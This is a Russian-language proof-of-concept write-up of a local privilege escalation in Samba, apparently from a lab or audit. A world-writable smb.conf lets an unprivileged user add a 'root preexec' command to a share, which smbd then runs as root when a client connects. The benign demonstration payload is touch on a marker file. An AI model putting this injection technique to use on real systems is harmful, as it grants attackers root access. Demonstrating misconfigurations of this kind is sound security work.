Критическая логическая уязвимость класса Local Privilege Escalation, возникающая вследствие некорректного распределения прав дискреционного управления доступом на конфигурационные файлы системных служб
Демон smbd обрабатывает инструкции конфигурационного файла /etc/samba/smb.conf с максимальными привилегиями суперпользователя
Если для данного файла допущена административная ошибка и выставлены избыточные права на запись для сторонних учетных записей, локальный низкопривилегированный нарушитель получает возможность модифицировать логику работы сетевой службы


Наличие избыточных прав на запись (write) для непривилегированных субъектов на критический системный объект файловой системы:
$ ls -la /etc/samba/smb.conf
-rw-rw-rw- 1 root root 2542 Jun 20 20:00 /etc/samba/smb.conf


Локальный пользователь без привилегий sudo открывает файл конфигурации и внедряет деструктивный триггер автоматизации в секцию активного ресурса [PublicShare]:
В структуру параметров импортируется команда генерации проверочного маркера в изолированной директории суперпользователя:
[PublicShare]
root preexec = touch /root/lpe_success.txt

Для активации встроенного обработчика выполняется стандартный легитимный запрос на подключение к сетевому ресурсу:
smbclient //127.0.0.1/PublicShare -U vsftpd%password123 -c "ls"

Сетевой демон smbd перечитал измененную конфигурацию и выполнил команду из-под учетной записи root. Проверка содержимого защищенного каталога /root/ подтверждает успешную генерацию маркера:
$ sudo ls -la /root/lpe_success.txt
-rw-r--r-- 1 root root 0 Jun 20 20:10 /root/lpe_success.txt
Тест доказывает, что нарушение базовых принципов разграничения прав DAC на системные конфигурации обходит любые другие защитные механизмы сетевого периметра службы
